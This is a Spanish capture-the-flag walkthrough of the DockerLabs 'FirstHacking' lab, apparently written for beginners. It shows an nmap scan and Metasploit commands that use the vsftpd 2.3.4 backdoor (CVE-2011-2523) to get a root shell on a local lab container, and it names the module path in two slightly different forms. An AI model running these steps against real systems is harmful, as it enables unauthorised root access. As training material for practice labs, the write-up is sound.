# DockerLabs - FirstHacking

## Información General

- **Nombre del desafío:** FirstHacking
- **Categoría:** Boot2Root
- **Dificultad:** Muy Fácil
- **Fecha:** 20/01/2025
- **Plataforma:** https://dockerlabs.es/

## Descripción del Desafío

El desafío "FirstHacking" de DockerLabs es una máquina diseñada para principiantes en el pentesting, con el objetivo de que realicen su primer CTF.

## Solución

### 1. Despliegue de la máquina

En primer lugar, ejecutaremos el script proporcionado junto con la máquina para desplegar el laboratorio. Nos aparecerá un mensaje informándonos de la IP utilizada por la máquina vulnerable, que es la `172.17.0.2`.

```bash
sudo bash auto_deploy.sh firsthacking.tar
```

![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20FirstHacking/assets/DockerLabs%20-%20FirstHacking%20(1).png)

### 2. Análisis de vulnerabilidades

Realizamos un escaneo de puertos utilizando `nmap` para identificar los servicios activos en la máquina objetivo. El escaneo revela que el puerto 21 (FTP) está abierto y funciona en su versión `vsftpd 2.3.4`.

```bash
nmap -T4 -A -v 172.17.0.2
```

- T4: Establece el nivel de velocidad del escaneo en "agresivo", lo que hace que el escaneo sea más rápido pero puede ser más detectable en la red.
- A: Activa la detección de sistema operativo, detección de versiones, escaneo de scripts y traceroute.
- v: Modo verbose (detallado), proporciona más información durante la ejecución del escaneo.

![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20FirstHacking/assets/DockerLabs%20-%20FirstHacking%20(2).png)

### 3. Explotación

Para explotar esta vulnerabilidad, utilizamos el framework Metasploit. Escribimos `msfconsole` en el terminal y realizamos una búsqueda por el servicio `vsftpd`. Encontramos un exploit que podría servirnos para nuestro cometido.

```bash
msfconsole
search vsftpd
```

![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20FirstHacking/assets/DockerLabs%20-%20FirstHacking%20(3).png)

Seleccionamos el módulo `exploit/unix/vsftpd_234_backdoor` y modificamos los parámetros correspondientes. En este caso, configuramos RHOSTS para que tenga la IP de la máquina vulnerable, esto es, `172.17.0.2`. 

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
```

![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20FirstHacking/assets/DockerLabs%20-%20FirstHacking%20(4).png)

Finalmente, ejecutamos el exploit con el comando `run`. 

### 4. Resolución

Al finalizar, tendremos acceso a una shell y estaremos dentro de la máquina. Para confirmar nuestros privilegios, ejecutamos:

```bash
whoami
```

La salida confirma que somos el usuario `root`.

![image](https://github.com/eliferrob/CTFs/blob/main/DockerLabs%20-%20FirstHacking/assets/DockerLabs%20-%20FirstHacking%20(5).png)

## Lecciones Aprendidas

- La importancia de identificar y explotar vulnerabilidades conocidas en servicios desactualizados.
- El uso de herramientas como Metasploit para automatizar la explotación de vulnerabilidades.

## Recursos

- [Información sobre la vulnerabilidad CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)




